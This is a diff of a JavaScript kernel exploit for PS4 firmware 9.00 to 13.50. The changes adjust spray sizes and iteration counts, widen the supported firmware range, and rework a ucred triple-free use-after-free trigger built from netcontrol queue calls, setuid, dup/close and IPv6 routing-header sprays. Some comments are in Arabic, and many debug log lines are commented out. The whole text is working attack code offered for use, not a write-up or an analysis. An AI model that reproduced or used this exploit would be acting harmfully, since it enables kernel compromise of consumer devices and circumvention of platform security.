@@ -108,7 +108,7 @@ var CPU_SET_SIZE = 0x10;
 var PIPEBUF_SIZE = 0x20;
 var MSG_HDR_SIZE = 0x30;
 var FILEDESCENT_SIZE = 0x8;
-var UCRED_SIZE = 0x168;
+var UCRED_SIZE = 0x80;
 var RTHDR_TAG = 0x13370000;
 var UIO_IOV_NUM = 0x14; // 20
 var MSG_IOV_NUM = 0x17; // 23
@@ -117,9 +117,9 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
-var MAIN_LOOP_ITERATIONS = 3;
+var MAIN_LOOP_ITERATIONS = 5;
 var TRIPLEFREE_ITERATIONS = 5;
-var MAX_ROUNDS_TWIN = 7;
+var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 150;
 var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
@@ -138,7 +138,7 @@ var twins = new Array(2);
 var triplets = new Array(3);
 var ipv6_socks = new Array(IPV6_SOCK_NUM);
 var spray_rthdr = malloc(UCRED_SIZE);
-var spray_rthdr_len = malloc(UCRED_SIZE);
+var spray_rthdr_len = UCRED_SIZE;
 var leak_rthdr = malloc(UCRED_SIZE);
 
 // Allocate buffer for ipv6_sockets magic spray
@@ -220,11 +220,11 @@ function set_sockopt(sd, level, optname, optval, optlen) {
 var real_set_sockopt = set_sockopt;
 
 set_sockopt = function(sd, level, optname, optval, optlen) {
-  log("[SETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen=" + optlen);
+  //log("[SETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen=" + optlen);
 
   var ret = real_set_sockopt(sd, level, optname, optval, optlen);
 
-  log("[SETSOCKOPT] AFTER ret=" + ret);
+  //log("[SETSOCKOPT] AFTER ret=" + ret);
 
   return ret;
 };
@@ -236,7 +236,7 @@ var cpu_mask_buf = malloc(0x10);
 var rtprio_scratch = malloc(0x4);
 var sockopt_val_buf = malloc(4);
 var nc_set_buf = malloc(8);
-var nc_clear_buf = malloc(32);
+var nc_clear_buf = malloc(8);
 var spawn_thr_args = malloc(0x80);
 var spawn_tid = malloc(0x8);
 var spawn_cpid = malloc(0x8);
@@ -256,12 +256,12 @@ var real_get_sockopt = get_sockopt;
 
 get_sockopt = function(sd, level, optname, optval, optlen) {
   write32(sockopt_len_ptr, optlen);
-  log("[GETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen_in=" + optlen);
+  //log("[GETSOCKOPT] BEFORE sd=" + sd + " level=" + level + " optname=" + optname + " optlen_in=" + optlen);
 
   var result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
 
   var out_len = read32(sockopt_len_ptr);
-  log("[GETSOCKOPT] AFTER result=" + result + " out_len=" + out_len);
+  //log("[GETSOCKOPT] AFTER result=" + result + " out_len=" + out_len);
 
   if (result.eq(BigInt_Error)) {
     throw new Error('get_sockopt error: ' + hex(result));
@@ -671,7 +671,7 @@ function init() {
     var bmin = Number(b_arr[1]);
     return amaj === bmaj ? amin - bmin : amaj - bmaj;
   };
-  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.04') > 0) {
+  if (compare_version(FW_VERSION, '9.00') < 0 || compare_version(FW_VERSION, '13.50') > 0) {
     send_notification('Unsupported PS4 firmware\nAborting...');
     return false;
   }
@@ -684,48 +684,40 @@ var prev_rtprio = -1;
 var cleanup_called = false;
 function setup() {
   try {
-
     debug('Preparing netctrl...');
 
+    // حفظ حالة الكور والأولوية الحالية
     prev_core = get_current_core();
     prev_rtprio = get_rtprio();
     pin_to_core(MAIN_CORE);
     set_rtprio(MAIN_RTPRIO);
     debug('  Previous core ' + prev_core + ' Pinned to core ' + MAIN_CORE);
-
     spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
     if (spray_rthdr_len <= 0) {
       cleanup(true);
       return false;
     }
-
     for (var i = 0; i < IPV6_SOCK_NUM; i++) {
       var base = spray_rthdr_rop.add(i * UCRED_SIZE);
       build_rthdr(base, UCRED_SIZE);
       write32(base.add(0x04), RTHDR_TAG | i);
     }
-
     write64(msg.add(0x10), msgIov);
     write64(msg.add(0x18), MSG_IOV_NUM);
-
     var dummyBuffer = malloc(0x1000);
     if (!dummyBuffer) {
       cleanup(true);
       return false;
     }
-
     fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);
     write64(uioIovRead.add(0x00), dummyBuffer);
     write64(uioIovWrite.add(0x00), dummyBuffer);
-
     socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
     uio_sock_0 = read32(uio_sock);
     uio_sock_1 = read32(uio_sock.add(4));
-
     socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
     iov_sock_0 = read32(iov_sock);
     iov_sock_1 = read32(iov_sock.add(4));
-
     for (var s = 0; s < ipv6_socks.length; s++) {
       ipv6_socks[s] = socket(AF_INET6, SOCK_STREAM, 0);
       if (ipv6_socks[s].eq(BigInt_Error)) {
@@ -733,38 +725,30 @@ function setup() {
         return false;
       }
     }
-
     free_rthdrs(ipv6_socks);
-
     pipe(pipe_sock);
     master_pipe[0] = read32(pipe_sock);
     master_pipe[1] = read32(pipe_sock.add(4));
-
     pipe(pipe_sock);
     victim_pipe[0] = read32(pipe_sock);
     victim_pipe[1] = read32(pipe_sock.add(4));
-
     masterRpipeFd = master_pipe[0];
     masterWpipeFd = master_pipe[1];
     victimRpipeFd = victim_pipe[0];
     victimWpipeFd = victim_pipe[1];
-
     fcntl(new BigInt(masterRpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(masterWpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(victimRpipeFd), F_SETFL, O_NONBLOCK);
     fcntl(new BigInt(victimWpipeFd), F_SETFL, O_NONBLOCK);
-
     init_threading();
     if (!create_workers()) {
       cleanup(true);
       return false;
     }
-
     if (!init_workers()) {
       cleanup(true);
       return false;
     }
-
     debug('Spawned workers iov[' + IOV_THREAD_NUM + '] uio_readv[' + UIO_THREAD_NUM + '] uio_writev[' + UIO_THREAD_NUM + ']');
     return true;
   } catch (e) {
@@ -1438,19 +1422,10 @@ function remove_uaf_file() {
     }
   }
 }
-function nc_call(cmd, buf, len) {
-  // بدل BigInt_Error استخدم 0 كـ handle/pid
-  var ret = netcontrol(new BigInt(0, 0), cmd, buf, len);
-  log("[NETCONTROL] cmd=" + hex(cmd) +
-      " len=" + len +
-      " ret=" + ret);
-  return ret;
-}
-
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 48;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 6000;
+
 function trigger_ucred_triplefree() {
-  send_notification("[T] trigger start");
   var end = false;
 
   log("[TRIGGER] init msgIov");
@@ -1461,39 +1436,26 @@ function trigger_ucred_triplefree() {
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
     main_count++;
 
-    // 1) فتح سوكت الإدارة وتسجيله في netcontrol
-    var main_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    if (main_socket.eq(BigInt_Error)) {
-      continue;
-    }
+    // 1) dummy socket → register in netcontrol
+    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
+    write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+    close(new BigInt(dummy_socket));
 
-    // 2) تسجيل السوكت في netcontrol ثم تخصيص ucred جديد
-    write32(nc_set_buf, Number(main_socket.and(0xFFFFFFFF)));
-    nc_call(NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
-
+    // 2) allocate new ucred
     setuid(1);
 
-    // 3) فتح سوكت جديد (uaf_socket)
-    var tmp_sock = socket(AF_UNIX, SOCK_STREAM, 0);
-    if (tmp_sock.eq(BigInt_Error)) {
-      log("[TRIGGER] uaf_socket error, retry");
-      continue;
-    }
-    uaf_socket = Number(tmp_sock.and(0xFFFFFFFF));
+    // 3) reclaim fd → uaf_socket
+    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));
 
-    // 4) تحرير ucred السابق
+    // 4) free previous ucred
     setuid(1);
 
-    // 5) إلغاء التسجيل من netcontrol باستخدام نفس السوكت الأساسي
-
-    write32(nc_clear_buf, Number(main_socket.and(0xFFFFFFFF)));
-    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
-
-    // إغلاق السوكت الأساسي بعد الانتهاء
-    close(main_socket);
+    // 5) unregister → free file + ucred
+    write32(nc_clear_buf, uaf_socket);
+    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
 
     // 6) refcount fix loop
-    send_notification("[T] refcount fix loop");
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
@@ -1502,12 +1464,21 @@ function trigger_ucred_triplefree() {
     }
     log("[TRIGGER] step 6 done");
 
+    // 🔍 refcount قبل أي double-free (على sock 0 كـ عينة)
+    write32(leak_rthdr.add(0x04), 0);
+    get_rthdr(ipv6_socks[0], leak_rthdr, 0x20);
+    var pre_ref = read32(leak_rthdr);
+    log("[TRIGGER] pre-doublefree refcount(sock0)=" + pre_ref);
+
     // 7) first double-free
+    log("[TRIGGER] step 7: first double-free via dup(uaf_socket)");
     close(dup(new BigInt(uaf_socket)));
+    log("[TRIGGER] step 7 done");
 
     // 8) find twins
-    send_notification("[T] searching twins");
+    log("[TRIGGER] step 8: find_twins()");
     end = find_twins();
+    log("[TRIGGER] step 8: find_twins() result end=" + end);
 
     if (!end) {
       log("[TRIGGER] step 8: no twins, cleanup & retry");
@@ -1516,22 +1487,19 @@ function trigger_ucred_triplefree() {
       close(new BigInt(uaf_socket));
       continue;
     }
+
     log("[TRIGGER] step 8: twins found twins[0]=" + twins[0] + " twins[1]=" + twins[1]);
-    send_notification("[T] twins found");  
-    
+
     // 9) free one twin
-    send_notification("[T] freeing twin header");
     free_rthdr(ipv6_socks[twins[1]]);
-    
-    // 🔍 refcount بعد free التوأم (ده المكان الصح)
+
+    // 🔍 refcount بعد free التوأم
     write32(leak_rthdr.add(0x04), 0);
     get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 0x20);
     var mid_ref = read32(leak_rthdr);
     log("[TRIGGER] mid-refcount (after free twin[1])=" + mid_ref);
-    send_notification("[T] refcount updated");
 
     // 10) wait refcount == 1
-    send_notification("[T] waiting for refcount == 1");
     var count = 0;
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
       trigger_iov_recvmsg();
@@ -1556,9 +1524,9 @@ function trigger_ucred_triplefree() {
       end = false;
       continue;
     }
+
     triplets[0] = twins[0];
     log("[TRIGGER] step 10: refcount==1, triplets[0]=" + triplets[0]);
-    send_notification("[T] refcount stable");
 
     // 11) triple-free
     log("[TRIGGER] step 11: triple-free via dup(uaf_socket)");
@@ -1592,7 +1560,7 @@ function trigger_ucred_triplefree() {
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
     log("[TRIGGER] step 13 done, triple found: [" +
-    triplets[0] + "," + triplets[1] + "," + triplets[2] + "]");
+        triplets[0] + "," + triplets[1] + "," + triplets[2] + "]");
   }
 
   if (main_count === TRIPLEFREE_ITERATIONS) {
